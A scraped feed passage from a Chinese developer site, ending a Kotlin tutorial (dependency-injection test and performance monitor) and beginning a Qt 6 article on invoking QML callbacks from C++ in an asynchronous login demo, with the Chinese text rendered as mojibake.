    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> userRepository: UserRepository
) : UserService {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getUser</span><span class="hljs-params">(id: <span class="hljs-type">Int</span>)</span></span>: String {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"æœåŠ¡: <span class="hljs-subst">${userRepository.findUser(id)}</span>"</span>
    }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">UserController</span> <span class="hljs-meta">@Inject</span> <span class="hljs-keyword">constructor</span>(
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> userService: UserService
) {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">showUser</span><span class="hljs-params">(id: <span class="hljs-type">Int</span>)</span></span>: String {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"æ§åˆ¶å™¨: <span class="hljs-subst">${userService.getUser(id)}</span>"</span>
    }
}

<span class="hljs-comment">// æµ‹è¯•è¿·ä½ æ¡†æ¶</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">testMiniDI</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> container = DIContainer()
    
    <span class="hljs-comment">// æ³¨å†Œä¾èµ–</span>
    container.register(UserRepository::<span class="hljs-keyword">class</span>, DatabaseUserRepository::<span class="hljs-keyword">class</span>)
    container.register(UserService::<span class="hljs-keyword">class</span>, UserServiceImpl::<span class="hljs-keyword">class</span>)
    container.register(UserController::<span class="hljs-keyword">class</span>)
    
    <span class="hljs-comment">// ä½¿ç”¨ä¾èµ–æ³¨å…¥</span>
    <span class="hljs-keyword">val</span> controller = container.<span class="hljs-keyword">get</span>&lt;UserController&gt;()
    <span class="hljs-keyword">val</span> result = controller.showUser(<span class="hljs-number">1</span>)
    
    println(<span class="hljs-string">"DI æ¡†æ¶æµ‹è¯•ç»“æœ: <span class="hljs-variable">$result</span>"</span>)
    
    <span class="hljs-comment">// éªŒè¯å•ä¾‹æ¨¡å¼</span>
    <span class="hljs-keyword">val</span> repo1 = container.<span class="hljs-keyword">get</span>&lt;UserRepository&gt;()
    <span class="hljs-keyword">val</span> repo2 = container.<span class="hljs-keyword">get</span>&lt;UserRepository&gt;()
    println(<span class="hljs-string">"å•ä¾‹éªŒè¯: <span class="hljs-subst">${repo1 === repo2}</span>"</span>) <span class="hljs-comment">// åº”è¯¥è¾“å‡º true</span>
}
</code></pre>
<h4 data-id="heading-17"><strong>å››åäº”ã€Kotlin æ€§èƒ½ç›‘æ§ä¸è°ƒè¯•</strong></h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// æ€§èƒ½ç›‘æ§å·¥å…·ç±»</span>
<span class="hljs-keyword">object</span> PerformanceMonitor {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> timings = mutableMapOf&lt;String, <span class="hljs-built_in">Long</span>&gt;()
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> counters = mutableMapOf&lt;String, <span class="hljs-built_in">Int</span>&gt;()
    
    <span class="hljs-keyword">inline</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> <span class="hljs-title">measure</span><span class="hljs-params">(operation: <span class="hljs-type">String</span>, block: () -&gt; <span class="hljs-type">T</span>)</span></span>: T {
        <span class="hljs-keyword">val</span> startTime = System.nanoTime()
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">return</span> block()
        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-keyword">val</span> duration = System.nanoTime() - startTime
            timings.merge(operation, duration) { old, new -&gt; (old + new) / <span class="hljs-number">2</span> }
            counters.merge(operation, <span class="hljs-number">1</span>) { old, new -&gt; old + new }
            println(<span class="hljs-string">"<span class="hljs-variable">$operation</span> è€—æ—¶: <span class="hljs-subst">${duration / <span class="hljs-number">1</span>_000_000}</span>ms"</span>)
        }
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">printStatistics</span><span class="hljs-params">()</span></span> {
        println(<span class="hljs-string">"\n=== æ€§èƒ½ç»Ÿè®¡ ==="</span>)
        timings.forEach { (operation, avgTime) -&gt;
            <span class="hljs-keyword">val</span> count = counters[operation] ?: <span class="hljs-number">0</span>
            println(<span class="hljs-string">"<span class="hljs-variable">$operation</span>: å¹³å‡ <span class="hljs-subst">${avgTime / <span class="hljs-number">1</span>_000_000}</span>ms (è°ƒç”¨ <span class="hljs-variable">$count</span> æ¬¡)"</span>)
        }
    }
}

<span class="hljs-comment">// ä½¿ç”¨æ€§èƒ½ç›‘æ§</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">testPerformanceMonitoring</span><span class="hljs-params">()</span></span> {
    PerformanceMonitor.measure(<span class="hljs-string">"æ•°æ®åŠ è½½"</span>) {
        Thread.sleep(<span class="hljs-number">500</span>) <span class="hljs-comment">// æ¨¡æ‹Ÿè€—æ—¶æ“ä½œ</span>
    }
    
    PerformanceMonitor.measure(<span class="hljs-string">"æ•°æ®å¤„ç†"</span>) {
        repeat(<span class="hljs-number">1000</span>) { i -&gt;
            PerformanceMonitor.measure(<span class="hljs-string">"å†…éƒ¨æ“ä½œ"</span>) {
                <span class="hljs-comment">// æ¨¡æ‹Ÿå†…éƒ¨æ“ä½œ</span>
                Math.sqrt(i.toDouble())
            }
        }
    }
    
    PerformanceMonitor.printStatistics()
}
</code></pre>
<h4 data-id="heading-18"><strong>ä¸‹ä¸€æ­¥ï¼šæˆä¸º Kotlin ä¸“å®¶</strong></h4>
<p>ä½ ç°åœ¨å·²ç»æŒæ¡äº† Kotlin çš„ç»ˆææŠ€èƒ½ï¼æ¥ä¸‹æ¥å¯ä»¥ï¼š</p>
<ol>
<li><strong>å‚ä¸ Kotlin ç¼–è¯‘å™¨å¼€å‘</strong>ï¼šè´¡çŒ®ç»™ Kotlin è¯­è¨€æœ¬èº«</li>
<li><strong>å¼€å‘ Kotlin ç¼–è¯‘å™¨æ’ä»¶</strong>ï¼šåˆ›å»ºè‡ªå®šä¹‰è¯­è¨€ç‰¹æ€§</li>
<li><strong>ç ”ç©¶ Kotlin ç¼–è¯‘å™¨å†…éƒ¨æœºåˆ¶</strong>ï¼šç†è§£ç±»å‹æ¨æ–­ã€ä»£ç ç”Ÿæˆ</li>
<li><strong>æ¢ç´¢ Kotlin å¤šå¹³å°å‰æ²¿</strong>ï¼šå®éªŒæ€§ç‰¹æ€§å’Œæ–°å¹³å°æ”¯æŒ</li>
<li><strong>è´¡çŒ®å¼€æº Kotlin é¡¹ç›®</strong>ï¼šæˆä¸º Kotlin ç”Ÿæ€ç³»ç»Ÿçš„ä¸€éƒ¨åˆ†</li>
</ol>
<p>ä½ å·²ç»ä» Kotlin æ–°æ‰‹æˆé•¿ä¸ºå¯ä»¥æ¢ç´¢è¯­è¨€è®¾è®¡æ·±åº¦çš„ä¸“å®¶ï¼ç»§ç»­å®è·µï¼Œå°†è¿™äº›é«˜çº§æŠ€æœ¯åº”ç”¨åˆ°å®é™…é¡¹ç›®ä¸­ï¼Œåˆ›é€ çœŸæ­£ä¼˜ç§€çš„æŠ€æœ¯è§£å†³æ–¹æ¡ˆã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Qt 6 å®æˆ˜ï¼šC++ è°ƒç”¨ QML å›è°ƒæ–¹æ³•ï¼ˆå¼‚æ­¥åœºæ™¯å®Œæ•´å®ç°ï¼‰]]></title>    <link>https://juejin.cn/post/7576108254604099627</link>    <guid>https://juejin.cn/post/7576108254604099627</guid>    <pubDate>2025-11-24T11:58:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576108254604099627" data-draft-id="7576108254604083243" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Qt 6 å®æˆ˜ï¼šC++ è°ƒç”¨ QML å›è°ƒæ–¹æ³•ï¼ˆå¼‚æ­¥åœºæ™¯å®Œæ•´å®ç°ï¼‰"/> <meta itemprop="keywords" content="å‰ç«¯,Qt,C++"/> <meta itemprop="datePublished" content="2025-11-24T11:58:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å–µä¸ªå’ª"/> <meta itemprop="url" content="https://juejin.cn/user/1350630784901262"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Qt 6 å®æˆ˜ï¼šC++ è°ƒç”¨ QML å›è°ƒæ–¹æ³•ï¼ˆå¼‚æ­¥åœºæ™¯å®Œæ•´å®ç°ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1350630784901262/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å–µä¸ªå’ª
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T11:58:34.000Z" title="Mon Nov 24 2025 11:58:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Qt 6 å®æˆ˜ï¼šC++ è°ƒç”¨ QML å›è°ƒæ–¹æ³•ï¼ˆå¼‚æ­¥åœºæ™¯å®Œæ•´å®ç°ï¼‰</h2>
<p>åœ¨ Qt 6 å¼€å‘ä¸­ï¼ŒC++ ä¸ QML æ··åˆç¼–ç¨‹æ˜¯å¸¸è§åœºæ™¯ã€‚å½“ C++ å¤„ç†å¼‚æ­¥æ“ä½œï¼ˆå¦‚ç™»å½•éªŒè¯ã€ç½‘ç»œè¯·æ±‚ã€æ•°æ®åº“æŸ¥è¯¢ï¼‰æ—¶ï¼Œéœ€è¦å°†ç»“æœé€šçŸ¥ç»™ QML ç•Œé¢ï¼Œ<strong>å›è°ƒå‡½æ•°</strong>æ˜¯æœ€ç›´è§‚çš„é€šä¿¡æ–¹å¼ä¹‹ä¸€ã€‚æœ¬æ–‡å°†åŸºäºä½ æä¾›çš„ä»£ç æ¡†æ¶ï¼Œè¡¥å……å…³é”®ç»†èŠ‚ã€ä¿®å¤æ½œåœ¨é—®é¢˜ï¼Œå¹¶å®Œæ•´å®ç°ä» C++ è°ƒç”¨ QML å›è°ƒçš„å…¨æµç¨‹ã€‚</p>
<h3 data-id="heading-1">ä¸€ã€æ ¸å¿ƒåœºæ™¯è¯´æ˜</h3>
<p>æˆ‘ä»¬éœ€è¦å®ç°ï¼š</p>
<ol>
<li>QML è°ƒç”¨ C++ çš„ <code>login</code> æ–¹æ³•ï¼ˆä¼ å…¥ç”¨æˆ·åã€å¯†ç å’Œä¸¤ä¸ªå›è°ƒå‡½æ•°ï¼šæˆåŠŸå›è°ƒ <code>onSuccess</code>ã€å¤±è´¥å›è°ƒ <code>onFailure</code>ï¼‰ï¼›</li>
<li>C++ å¼‚æ­¥å¤„ç†ç™»å½•é€»è¾‘ï¼ˆæ¨¡æ‹Ÿè€—æ—¶æ“ä½œï¼‰ï¼›</li>
<li>ç™»å½•å®Œæˆåï¼ŒC++ è°ƒç”¨å¯¹åº”çš„ QML å›è°ƒå‡½æ•°ï¼Œå°†ç»“æœï¼ˆæˆåŠŸå“åº” / é”™è¯¯ä¿¡æ¯ï¼‰ä¼ é€’ç»™ QMLã€‚</li>
</ol>
<h3 data-id="heading-2">äºŒã€Step 1ï¼šå®Œå–„ C++ æœåŠ¡ç±»</h3>
<h4 data-id="heading-3">1.1 åŸºç¡€é…ç½®ï¼ˆå¿…é¡»ç»§æ‰¿ QObjectï¼‰</h4>
<p>QML èƒ½è°ƒç”¨çš„ C++ æ–¹æ³• / å±æ€§ï¼Œä¾èµ– Qt çš„å…ƒå¯¹è±¡ç³»ç»Ÿï¼ˆMOCï¼‰ï¼Œå› æ­¤ <code>AuthenticationService</code> å¿…é¡»ï¼š</p>
<ul>
<li>ç»§æ‰¿ <code>QObject</code>ï¼›</li>
<li>æ·»åŠ  <code>Q_OBJECT</code> å®ï¼›</li>
<li>ç”¨ <code>Q_INVOKABLE</code> æ ‡è®°éœ€è¦æš´éœ²ç»™ QML çš„æ–¹æ³•ã€‚</li>
</ul>
<h4 data-id="heading-4">1.2 å®Œæ•´ C++ ä»£ç å®ç°</h4>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// authentication_service.h</span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;QObject&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;QJSValue&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;QJSEngine&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;QtConcurrent&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;QThread&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;QMetaObject&gt;</span></span>

<span class="hljs-comment">// è‡ªå®šä¹‰é”™è¯¯ç±»ï¼šå°è£…é”™è¯¯ç ã€é”™è¯¯ä¿¡æ¯</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">KratosError</span> {
<span class="hljs-keyword">public</span>:
    <span class="hljs-built_in">KratosError</span>(<span class="hljs-type">int</span> code, <span class="hljs-type">const</span> QString&amp; message, <span class="hljs-type">const</span> QString&amp; details = <span class="hljs-string">""</span>)
        : <span class="hljs-built_in">m_code</span>(code), <span class="hljs-built_in">m_message</span>(message), <span class="hljs-built_in">m_details</span>(details) {}

    <span class="hljs-comment">// è½¬æ¢ä¸º QJSValueï¼Œä¾› QML è®¿é—®å±æ€§</span>
    <span class="hljs-function">QJSValue <span class="hljs-title">toQJSValue</span><span class="hljs-params">(QJSEngine&amp; engine)</span> <span class="hljs-type">const</span> </span>{
        QJSValue errorObj = engine.<span class="hljs-built_in">newObject</span>();
        errorObj.<span class="hljs-built_in">setProperty</span>(<span class="hljs-string">"code"</span>, m_code);       <span class="hljs-comment">// é”™è¯¯ç ï¼ˆå¦‚ 401 æœªæˆæƒï¼‰</span>
        errorObj.<span class="hljs-built_in">setProperty</span>(<span class="hljs-string">"message"</span>, m_message); <span class="hljs-comment">// é”™è¯¯æç¤º</span>
        errorObj.<span class="hljs-built_in">setProperty</span>(<span class="hljs-string">"details"</span>, m_details); <span class="hljs-comment">// è¯¦ç»†ä¿¡æ¯ï¼ˆå¯é€‰ï¼‰</span>
        <span class="hljs-keyword">return</span> errorObj;
    }

<span class="hljs-keyword">private</span>:
    <span class="hljs-type">int</span> m_code;
    QString m_message;
    QString m_details;
};

<span class="hljs-comment">// ç™»å½•æˆåŠŸå“åº”ç±»ï¼šå°è£…è¿”å›æ•°æ®</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">LoginResponse</span> {
    QString token;     <span class="hljs-comment">// èº«ä»½ä»¤ç‰Œ</span>
    QString username;  <span class="hljs-comment">// ç”¨æˆ·å</span>
    <span class="hljs-type">int</span> userId;        <span class="hljs-comment">// ç”¨æˆ· ID</span>

    <span class="hljs-comment">// è½¬æ¢ä¸º QJSValueï¼Œä¾› QML è®¿é—®å±æ€§</span>
    <span class="hljs-function">QJSValue <span class="hljs-title">toQJSValue</span><span class="hljs-params">(QJSEngine&amp; engine)</span> <span class="hljs-type">const</span> </span>{
        QJSValue respObj = engine.<span class="hljs-built_in">newObject</span>();
        respObj.<span class="hljs-built_in">setProperty</span>(<span class="hljs-string">"token"</span>, token);
        respObj.<span class="hljs-built_in">setProperty</span>(<span class="hljs-string">"username"</span>, username);
        respObj.<span class="hljs-built_in">setProperty</span>(<span class="hljs-string">"userId"</span>, userId);
        <span class="hljs-keyword">return</span> respObj;
    }
};

<span class="hljs-comment">// è®¤è¯æœåŠ¡ç±»ï¼ˆå•ä¾‹æ¨¡å¼ï¼‰</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">AuthenticationService</span> : <span class="hljs-keyword">public</span> QObject {
    Q_OBJECT <span class="hljs-comment">// å¿…é¡»æ·»åŠ ï¼Œå¯ç”¨å…ƒå¯¹è±¡ç³»ç»Ÿ</span>
<span class="hljs-keyword">public</span>:
    <span class="hljs-comment">// å•ä¾‹è·å–æ–¹æ³•ï¼ˆçº¿ç¨‹å®‰å…¨ï¼‰</span>
    <span class="hljs-function"><span class="hljs-type">static</span> AuthenticationService* <span class="hljs-title">instance</span><span class="hljs-params">()</span> </span>{
        <span class="hljs-type">static</span> QMutex mutex;
        <span class="hljs-keyword">if</span> (!m_instance) {
            mutex.<span class="hljs-built_in">lock</span>();
            <span class="hljs-keyword">if</span> (!m_instance) {
                m_instance = <span class="hljs-keyword">new</span> <span class="hljs-built_in">AuthenticationService</span>();
            }
            mutex.<span class="hljs-built_in">unlock</span>();
        }
        <span class="hljs-keyword">return</span> m_instance;
    }

    <span class="hljs-comment">// ç¦æ­¢æ‹·è´æ„é€ å’Œèµ‹å€¼</span>
    <span class="hljs-built_in">AuthenticationService</span>(<span class="hljs-type">const</span> AuthenticationService&amp;) = <span class="hljs-keyword">delete</span>;
    AuthenticationService&amp; <span class="hljs-keyword">operator</span>=(<span class="hljs-type">const</span> AuthenticationService&amp;) = <span class="hljs-keyword">delete</span>;

    <span class="hljs-comment">// æš´éœ²ç»™ QML çš„ç™»å½•æ–¹æ³•</span>
    <span class="hljs-function">Q_INVOKABLE <span class="hljs-type">void</span> <span class="hljs-title">login</span><span class="hljs-params">(
        <span class="hljs-type">const</span> QString&amp; username,
        <span class="hljs-type">const</span> QString&amp; password,
        <span class="hljs-type">const</span> QJSValue&amp; onSuccess,  <span class="hljs-comment">// QML ä¼ å…¥çš„æˆåŠŸå›è°ƒ</span>
        <span class="hljs-type">const</span> QJSValue&amp; onFailure   <span class="hljs-comment">// QML ä¼ å…¥çš„å¤±è´¥å›è°ƒ</span>
    )</span></span>;

<span class="hljs-keyword">private</span>:
    <span class="hljs-built_in">AuthenticationService</span>(QObject* parent = <span class="hljs-literal">nullptr</span>) : <span class="hljs-built_in">QObject</span>(parent) {}
    <span class="hljs-type">static</span> AuthenticationService* m_instance;
};

<span class="hljs-comment">// authentication_service.cpp</span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"authentication_service.h"</span></span>

AuthenticationService* AuthenticationService::m_instance = <span class="hljs-literal">nullptr</span>;

<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">AuthenticationService::login</span><span class="hljs-params">(
    <span class="hljs-type">const</span> QString&amp; username,
    <span class="hljs-type">const</span> QString&amp; password,
    <span class="hljs-type">const</span> QJSValue&amp; onSuccess,
    <span class="hljs-type">const</span> QJSValue&amp; onFailure
)</span> </span>{
    <span class="hljs-comment">// 1. æœ‰æ•ˆæ€§æ£€æŸ¥ï¼šç¡®ä¿ QJSEngine å’Œå›è°ƒå‡½æ•°æœ‰æ•ˆ</span>
    QJSEngine* engine = <span class="hljs-built_in">qjsEngine</span>(<span class="hljs-keyword">this</span>);
    <span class="hljs-keyword">if</span> (!engine) {
        <span class="hljs-built_in">qWarning</span>() &lt;&lt; <span class="hljs-string">"[AuthService] å¤±è´¥ï¼šæ— æ³•è·å– QJSEngine ä¸Šä¸‹æ–‡"</span>;
        <span class="hljs-keyword">return</span>;
    }
    <span class="hljs-keyword">if</span> (!onSuccess.<span class="hljs-built_in">isCallable</span>() &amp;&amp; !onFailure.<span class="hljs-built_in">isCallable</span>()) {
        <span class="hljs-built_in">qWarning</span>() &lt;&lt; <span class="hljs-string">"[AuthService] è­¦å‘Šï¼šæœªä¼ å…¥æœ‰æ•ˆå›è°ƒå‡½æ•°"</span>;
        <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-comment">// 2. å¼‚æ­¥å¤„ç†ç™»å½•é€»è¾‘ï¼ˆæ¨¡æ‹Ÿè€—æ—¶æ“ä½œï¼šå¦‚ç½‘ç»œè¯·æ±‚ã€æ•°æ®åº“éªŒè¯ï¼‰</span>
    <span class="hljs-comment">// ç”¨ QtConcurrent::run å¼€å¯åå°çº¿ç¨‹ï¼Œé¿å…é˜»å¡ UI çº¿ç¨‹</span>
    QtConcurrent::<span class="hljs-built_in">run</span>([=, <span class="hljs-keyword">this</span>]() {
        <span class="hljs-comment">// æ¨¡æ‹Ÿè€—æ—¶ 2 ç§’ï¼ˆå®é™…åœºæ™¯æ›¿æ¢ä¸ºçœŸå®ç™»å½•é€»è¾‘ï¼‰</span>
        QThread::<span class="hljs-built_in">sleep</span>(<span class="hljs-number">2</span>);

        <span class="hljs-comment">// 3. æ¨¡æ‹Ÿç™»å½•éªŒè¯ç»“æœï¼ˆå®é™…åœºæ™¯æ›¿æ¢ä¸ºçœŸå®æ ¡éªŒé€»è¾‘ï¼‰</span>
        <span class="hljs-type">bool</span> isLoginSuccess = (username == <span class="hljs-string">"admin"</span> &amp;&amp; password == <span class="hljs-string">"123456"</span>);

        <span class="hljs-comment">// 4. åˆ‡æ¢å›ä¸»çº¿ç¨‹æ‰§è¡Œå›è°ƒï¼ˆå…³é”®ï¼QJSValue å¿…é¡»åœ¨åˆ›å»ºå®ƒçš„çº¿ç¨‹è°ƒç”¨ï¼‰</span>
        QMetaObject::<span class="hljs-built_in">invokeMethod</span>(<span class="hljs-keyword">this</span>, [=, <span class="hljs-keyword">this</span>]() {
            <span class="hljs-keyword">if</span> (isLoginSuccess) {
                <span class="hljs-comment">// ç™»å½•æˆåŠŸï¼šæ„é€ å“åº”å¯¹è±¡ï¼Œè°ƒç”¨ onSuccess å›è°ƒ</span>
                <span class="hljs-keyword">if</span> (onSuccess.<span class="hljs-built_in">isCallable</span>()) {
                    LoginResponse resp;
                    resp.token = <span class="hljs-string">"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."</span>;
                    resp.username = username;
                    resp.userId = <span class="hljs-number">1001</span>;

                    QJSValueList args;
                    args &lt;&lt; resp.<span class="hljs-built_in">toQJSValue</span>(*engine); <span class="hljs-comment">// ä¼ å…¥å“åº”æ•°æ®</span>
                    onSuccess.<span class="hljs-built_in">call</span>(args);             <span class="hljs-comment">// è°ƒç”¨ QML æˆåŠŸå›è°ƒ</span>
                }
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">// ç™»å½•å¤±è´¥ï¼šæ„é€ é”™è¯¯å¯¹è±¡ï¼Œè°ƒç”¨ onFailure å›è°ƒ</span>
                <span class="hljs-keyword">if</span> (onFailure.<span class="hljs-built_in">isCallable</span>()) {
                    KratosError <span class="hljs-built_in">error</span>(<span class="hljs-number">401</span>, <span class="hljs-string">"ç™»å½•å¤±è´¥"</span>, <span class="hljs-string">"ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯"</span>);

                    QJSValueList args;
                    args &lt;&lt; error.<span class="hljs-built_in">toQJSValue</span>(*engine); <span class="hljs-comment">// ä¼ å…¥é”™è¯¯ä¿¡æ¯</span>
                    onFailure.<span class="hljs-built_in">call</span>(args);              <span class="hljs-comment">// è°ƒç”¨ QML å¤±è´¥å›è°ƒ</span>
                }
            }
        }, Qt::QueuedConnection); <span class="hljs-comment">// é˜Ÿåˆ—è¿æ¥ï¼šç¡®ä¿åœ¨ä¸»çº¿ç¨‹æ‰§è¡Œ</span>
    });
}
</code></pre>
<h3 data-id="heading-5">ä¸‰ã€Step 2ï¼šæ³¨å†Œ C++ å•ä¾‹åˆ° QML</h3>
<p>åœ¨ <code>main.cpp</code> ä¸­ï¼Œå°† <code>AuthenticationService</code> å•ä¾‹æ³¨å†Œåˆ° QML ä¸Šä¸‹æ–‡ï¼Œè®© QML å¯ä»¥ç›´æ¥è®¿é—®ï¼š</p>
